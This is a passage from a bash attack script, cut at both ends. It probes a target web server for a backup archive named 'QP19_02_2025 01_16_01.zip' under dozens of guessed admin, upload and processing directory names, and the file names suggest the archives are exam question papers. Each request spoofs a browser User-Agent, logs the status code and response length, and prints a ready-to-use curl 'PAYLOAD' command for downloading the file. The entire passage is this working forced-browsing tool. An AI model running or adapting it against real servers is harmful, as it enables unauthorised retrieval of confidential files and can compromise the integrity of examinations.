${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminAutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperHandling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
